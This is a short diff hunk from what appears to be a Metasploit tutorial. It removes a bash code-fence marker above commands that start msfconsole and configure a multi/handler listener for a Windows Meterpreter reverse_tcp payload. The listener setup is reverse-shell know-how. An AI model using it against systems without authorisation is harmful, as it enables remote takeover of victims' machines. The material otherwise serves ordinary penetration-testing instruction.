@@ -267,7 +267,7 @@ You don't need msfconsole to create payloads. `msfvenom` is a separate tool that
 
 After generating a payload, you need a listener in msfconsole:
 
-```bash
+
 msfconsole -q
 use exploit/multi/handler
 set payload windows/x64/meterpreter/reverse_tcp
